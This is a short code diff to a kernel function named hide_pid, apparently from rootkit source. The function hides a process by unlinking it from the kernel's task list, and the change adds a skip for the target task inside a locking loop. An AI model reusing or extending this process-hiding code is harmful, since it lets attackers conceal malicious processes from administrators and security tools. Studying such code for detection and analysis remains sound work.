@@ -72,6 +72,10 @@ hide_pid(pid_t pid)
     rcu_read_lock();
     for_each_process(ts2) {
         task_lock(ts2);
+        if(ts == ts2) {
+            task_unlock(ts2);
+            continue;
+        }
     }
     list_del(&ts->tasks);
     for_each_process(ts2) {
